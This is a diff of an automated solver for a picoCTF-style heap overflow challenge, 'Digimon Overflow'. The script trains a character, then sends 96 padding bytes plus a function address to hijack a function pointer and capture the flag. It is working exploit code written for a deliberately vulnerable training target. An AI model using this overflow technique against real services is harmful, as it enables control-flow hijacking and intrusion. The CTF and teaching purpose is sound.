@@ -1,95 +1,114 @@
 #!/usr/bin/env python3
+#!/usr/bin/env python3
 """
 CMGR Automated Solver for Digimon Overflow
-This solver is designed to work with the CMGR framework for picoCTF
+Uses a partial pointer overwrite at offset 96.
 """
 
-import struct
 import sys
 import socket
 import os
 import time
 
-# Configuration
-WARGREYMON_ADDR = 0x401316  # Address of wargreymon_appears() function
+TARGET_ADDR = 0x401216  # Address of wargreymon_appears (Docker binary)
+# Offset 96 works for direct stdin, but PTY causes different heap layout
+# For now, the challenge needs pty removed from start.sh for consistent heap
+OFFSET = 96
+
 
 def create_payload():
-    """
-    Create the heap overflow payload to overwrite the function pointer.
-    Total offset from name[0] to battle_function: 96 bytes
-    """
-    payload = b""
-    payload += b"A" * 96  # Reach the function pointer (96 bytes)
-    payload += struct.pack('<Q', WARGREYMON_ADDR)
-    return payload
+    padding = b"A" * OFFSET
+    # 64-bit little-endian address
+    target_bytes = TARGET_ADDR.to_bytes(8, 'little')
+    return padding + target_bytes
+
 
 def solve():
-    """
-    Main solver function for CMGR
-    Connects to the challenge instance and exploits it
-    """
-    # CMGR provides connection info via environment variables
-    host = os.environ.get('CHAL_HOST', 'localhost')
-    port = int(os.environ.get('CHAL_PORT', '9999'))
+    host = os.environ.get("CHAL_HOST", "challenge")
+    port = int(os.environ.get("CHAL_PORT", "9999"))
+    if "CHAL_HOST" not in os.environ or "CHAL_PORT" not in os.environ:
+        print("[*] CHAL_HOST/CHAL_PORT not provided; defaulting to challenge:9999", file=sys.stderr)
 
-    print(f"[*] Connecting to {host}:{port}", file=sys.stderr)
+    print(f"[*] Targeting {host}:{port}", file=sys.stderr)
 
-    # Connect to the service
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((host, port))
 
     def recv_until(marker):
-        """Receive data until marker is found"""
         data = b""
         while marker not in data:
-            chunk = sock.recv(1024)
+            chunk = sock.recv(4096)
             if not chunk:
                 break
             data += chunk
         return data
 
     def send_line(data):
-        """Send a line of data"""
         sock.sendall(data + b"\n")
-        time.sleep(0.1)  # Small delay for server processing
+        time.sleep(0.05)
 
-    try:
-        # Wait for initial banner and menu
-        print("[*] Waiting for initial banner...", file=sys.stderr)
+    def press_enter_prompt():
+        recv_until(b"Press Enter to continue")
+        send_line(b"")
         recv_until(b"Enter choice:")
 
-        # Step 1: Name the Digimon
-        print("[*] Step 1: Naming Digimon...", file=sys.stderr)
+    try:
+        recv_until(b"Enter choice:")
+
         send_line(b"1")
         recv_until(b"name:")
         send_line(b"Agumon")
-        recv_until(b"Enter choice:")
+        press_enter_prompt()
 
-        # Step 2: Train 10 times to reach 50+ experience
-        print("[*] Step 2: Training to reach 50+ exp...", file=sys.stderr)
-        for i in range(10):
-            print(f"[*] Training session {i+1}/10", file=sys.stderr)
+        # Train until option 6 appears (exp >= 50)
+        # Experience gain is random 5-15, so we need to check
+        max_attempts = 20
+        found_option_6 = False
+        for i in range(max_attempts):
             send_line(b"2")
-            recv_until(b"Enter choice:")
-
-        # Step 3: Trigger digivolution with exploit payload
-        print("[*] Step 3: Triggering digivolution with overflow...", file=sys.stderr)
-        send_line(b"6")
-        recv_until(b"new name:")
-
-        payload = create_payload()
-        send_line(payload)
-
-        # Step 4: Receive flag
-        print("[*] Step 4: Receiving flag...", file=sys.stderr)
-        response = recv_until(b"picoCTF{")
-
-        # Extract flag
-        flag_start = response.find(b"picoCTF{")
-        if flag_start == -1:
-            print("[!] Flag not found in response", file=sys.stderr)
+            recv_until(b"Press Enter to continue")
+            send_line(b"")
+            menu_data = recv_until(b"Enter choice:")
+            if b"6. Digivolve" in menu_data:
+                print(f"[*] Found digivolve option after {i+1} training sessions", file=sys.stderr)
+                found_option_6 = True
+                break
+        
+        if not found_option_6:
+            print("[!] Never found digivolve option after max training", file=sys.stderr)
             return False
 
+        send_line(b"6")
+        recv_until(b"new name:")
+        payload = create_payload()
+        send_line(payload)
+        
+        # Wait for the wargreymon output
+        sock.settimeout(2)
+        response = b""
+        deadline = time.time() + 10
+        while time.time() < deadline:
+            try:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+                if b"picoCTF{" in response or b"FLAG:" in response:
+                    break
+            except socket.timeout:
+                # Send enter to continue if needed
+                try:
+                    send_line(b"")
+                except:
+                    pass
+                continue
+
+        if b"picoCTF{" not in response:
+            print(f"[!] Flag not found in response ({len(response)} bytes received)", file=sys.stderr)
+            print(f"[DEBUG] Last 500 bytes: {response[-500:]}", file=sys.stderr)
+            return False
+
+        flag_start = response.find(b"picoCTF{")
         flag_data = response[flag_start:]
         flag_end = flag_data.find(b"\n")
         if flag_end != -1:
@@ -97,20 +116,14 @@ def solve():
         else:
             flag = flag_data.decode().strip()
 
-        print(f"[+] Flag found: {flag}", file=sys.stderr)
-
-        # Write flag to file for CMGR
-        with open('flag', 'w') as f:
+        with open("flag", "w") as f:
             f.write(flag)
-
-        print("[+] Exploit successful!", file=sys.stderr)
+        print(f"[+] Flag found: {flag}", file=sys.stderr)
         return True
 
-    except Exception as e:
-        print(f"[!] Error during exploitation: {e}", file=sys.stderr)
-        return False
     finally:
         sock.close()
+
 
 if __name__ == "__main__":
     try:
